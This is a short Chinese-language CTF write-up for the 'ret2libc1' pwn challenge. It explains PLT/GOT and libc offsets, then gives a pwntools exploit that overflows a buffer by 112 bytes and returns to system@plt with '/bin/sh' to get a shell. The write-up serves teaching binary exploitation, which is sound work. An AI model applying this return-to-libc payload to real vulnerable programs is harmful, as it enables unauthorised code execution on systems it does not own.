# ret2libc1



#### 先讲几个知识点：

1. system函数属于libc，并且libc.so动态链接库中的函数之间相对偏移是固定的，即使打开ASLR也是如此。
2. PLT(Procedure Linkage Table)表中的数据不是函数的真实地址，带有@plt的函数起个过渡作用。
3. GOT(Global Offset Table)表中的数据才是函数最终的地址，plt表中的数据是got表的地址，可以通过plt表跳转到got表来得到函数的真正地址。
4. 地址随机化没有对PLT表和GOT表起作用。



首先file和checksec一下![1](C:\Users\86177\Desktop\PWN\retlibc\ret2libc1\1.png)

ida查看，没有后门函数，nx打开，且是动态链接程序

![2](C:\Users\86177\Desktop\PWN\retlibc\ret2libc1\2.png)

虽然说没有后门函数，但是调用了system函数：

![3](C:\Users\86177\Desktop\PWN\retlibc\ret2libc1\3.png)

并且有/bin/sh字符串：

![4](C:\Users\86177\Desktop\PWN\retlibc\ret2libc1\4.png)

gdb调试，ebp:0xffffd128

![5](C:\Users\86177\Desktop\PWN\retlibc\ret2libc1\5.png)

所以exp可以这样：

```python
from pwn import *
io = process("./ret2libc1")
elf = ELF("./ret2libc1")
system_plt = elf.plt["system"]
bin_sh = next(elf.search(b"/bin/sh"))
payload = b'A'*112 + p32(system_plt)+b'aaaa' + p32(bin_sh)
io.sendline(payload)
io.interactive()
```

![6](C:\Users\86177\Desktop\PWN\retlibc\ret2libc1\6.png)